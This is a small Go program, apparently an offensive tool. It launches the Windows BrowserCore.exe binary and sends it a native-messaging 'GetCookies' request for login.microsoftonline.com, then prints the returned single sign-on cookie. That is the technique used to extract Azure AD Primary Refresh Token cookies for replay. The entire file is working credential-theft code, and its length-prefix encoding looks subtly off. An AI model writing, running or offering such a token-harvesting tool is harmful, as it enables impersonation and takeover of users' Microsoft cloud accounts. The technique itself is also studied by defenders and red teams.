package main

import (
	"fmt"
	"os"
	"log"
	"os/exec"
	"encoding/binary"
	"io/ioutil"
)

func checkFiles() (string,bool) {
	filelocs :=[]string{"C:\\Program Files\\Windows Security\\BrowserCore\\browsercore.exe","C:\\Windows\\BrowserCore\\browsercore.exe"}
	for x := range filelocs{
		if _,err := os.Stat(filelocs[x]); os.IsNotExist(err){
			//doesnt exist
			continue
		}
		if _,err := os.Stat(filelocs[x]); !os.IsNotExist(err){
			//exists
			return filelocs[x],true
		}
	}
	return "error",false
}

func main(){
	targetFile,errorBool := checkFiles()
	if errorBool == false{
		log.Fatal("BrowserCore.exe File not Found!")
	}
	fmt.Printf("Found BrowserCore.exe File! => %s\n",targetFile)
	//continue here
	browserCmd := exec.Command(targetFile)
	browserCmdIn ,_ := browserCmd.StdinPipe()
	browserCmdOut ,_ := browserCmd.StdoutPipe()
	browserCmd.Start()
	// adding nonce support tommorow \"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}\","
	stuff := "{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\",\"sender\":\"https://login.microsoftonline.com\"}"
	fmt.Println("Sending json to process stdin => ",stuff)
	stuffLen := len(stuff)
	b := make([]byte, 4)
	binary.PutVarint(b, int64(stuffLen))
	browserCmdIn.Write(b)
	browserCmdIn.Write([]byte(stuff))
	browserCmdIn.Close()
	browserCmdBytes,_ := ioutil.ReadAll(browserCmdOut)
	browserCmd.Wait()
	fmt.Printf("Result => %s",string(browserCmdBytes))

}
